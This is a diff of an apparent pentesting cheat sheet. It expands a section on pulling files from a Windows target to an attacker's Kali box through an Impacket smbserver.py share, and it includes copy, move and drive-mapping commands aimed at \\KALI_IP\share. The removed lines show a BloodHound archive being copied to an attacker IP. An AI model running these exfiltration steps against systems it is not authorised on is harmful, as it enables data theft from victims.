@@ -129,34 +129,149 @@ get file
 
 ---
 
-# 7. SMB File Transfer
+# 7. SMB File Transfer with smbserver.py
 
-Start SMB server:
+## Start SMB Server on Kali
 
-```bash
-mkdir loot
-cd loot
-smbserver.py share . -smb2support
-```
-
-Victim access:
+### Create Share Directory
 
 ```bash
-\\ATTACKER_IP\share
+mkdir ~/share
 ```
 
-Copy file (from windows to kali):
+### Start SMB Server
+
+```bash
+smbserver.py -smb2support share ~/share
+```
+
+### Authenticated SMB Share
+
+```bash
+smbserver.py -smb2support -username user -password pass share ~/share
+```
+
+### Verbose / Debug Mode
+
+```bash
+smbserver.py -debug -smb2support share ~/share
+```
+
+### Share Current Directory
+
+```bash
+smbserver.py -smb2support share .
+```
+
+### Bind to Specific Interface
+
+```bash
+smbserver.py -ip 0.0.0.0 -smb2support share ~/share
+```
+
+---
+
+## Access SMB Share from Windows
+
+## CMD
+
+### List Share
 
 ```cmd
-copy file.txt \\10.10.14.5\share\
-copy 20260416085446_BloodHound.zip \\10.150.72.7\share\ 
+dir \\KALI_IP\share
 ```
 
-For authenticated access
+### Authenticate to SMB Share
 
+```cmd
+net use \\KALI_IP\share /user:user pass
 ```
-smbserver.py share . -smb2support -username test -password test
-copy 20260416085446_BloodHound.zip \\test:test@10.150.72.7\share\
+
+---
+
+## Transfer Files from Windows to Kali
+
+## CMD
+
+### Copy File
+
+```cmd
+copy C:\Users\User\Desktop\file.exe \\KALI_IP\share\
+```
+
+### Move File
+
+```cmd
+move C:\Users\User\Desktop\file.exe \\KALI_IP\share\
+```
+
+---
+
+## PowerShell
+
+### Copy File
+
+```powershell
+Copy-Item "C:\Users\User\Desktop\file.exe" "\\KALI_IP\share\"
+```
+
+### Authenticated Copy
+
+```powershell
+net use \\KALI_IP\share /user:user pass
+Copy-Item "C:\Users\User\Desktop\file.exe" "\\KALI_IP\share\"
+```
+
+---
+
+# Map SMB Share as Drive
+
+## Map Drive
+
+```cmd
+net use Z: \\KALI_IP\share
+```
+
+## Map Authenticated Drive
+
+```cmd
+net use Z: \\KALI_IP\share /user:user pass
+```
+
+## Copy File to Mapped Drive
+
+```cmd
+copy file.exe Z:\
+```
+
+## Disconnect Drive
+
+```cmd
+net use Z: /delete
+```
+
+---
+
+## Verify Connectivity
+
+## Check SMB Port
+
+```powershell
+Test-NetConnection KALI_IP -Port 445
+```
+
+## Verify Share Access
+
+```cmd
+dir \\KALI_IP\share
+```
+
+
+
+## Remove SMB Connections
+
+```cmd
+net use * /delete
 ```
 
 ---
